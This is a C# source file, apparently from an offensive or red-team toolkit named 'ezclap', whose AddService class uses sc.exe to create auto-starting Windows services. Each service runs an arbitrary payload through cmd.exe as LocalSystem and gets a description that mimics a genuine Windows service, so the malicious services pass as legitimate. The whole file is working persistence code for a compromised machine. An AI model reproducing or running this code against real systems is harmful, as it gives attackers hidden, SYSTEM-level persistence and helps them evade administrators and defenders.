using System;
using System.ServiceProcess;

namespace ezclap
{
	public class AddService
    {
        /*
        * Name: AddService
        * Description: Create service using sc.exe. Be noted if the payload is not a Windows Service Binary, 
        * the service will return Error 1053. 
        * 
        * Params:
        *  - (string) serviceName = Name of the service to be created 
        *  - (string) payload = Payload to be triggered upon service start 
        * 
        * */
        public AddService(string[] serviceNames, string[] payload)
        {
            Random rnd = new Random();
            Array.ForEach(serviceNames, element => Initialize(element, payload[rnd.Next(0, payload.Length - 1)]));
        }

		public static void Initialize(string serviceName, string payload)
        {
            string arguments = "create \"" + serviceName + "\" binPath= \"cmd.exe /c " + payload + "\" start=\"auto\" obj=\"LocalSystem\" ";
            string description = "Facilitates the running of interactive applications with additional administrative privileges.  If this service is stopped, users will be unable to launch applications with the additional administrative privileges they may require to perform desired user tasks.";
            System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", arguments);
            System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", "description " + serviceName + " \"" + description + "\"");
        }

        public void StartService(string serviceName, int timeoutMilli)
        {
            ServiceController service = new ServiceController(serviceName);

            try{
                TimeSpan timeout = TimeSpan.FromMilliseconds(timeoutMilli);

                service.Start();
                //service.WaitForStatus(ServiceControllerStatus.Running, timeout);
            }
            catch (Exception e) {
                Console.WriteLine(e);
            }
        }
    }
}
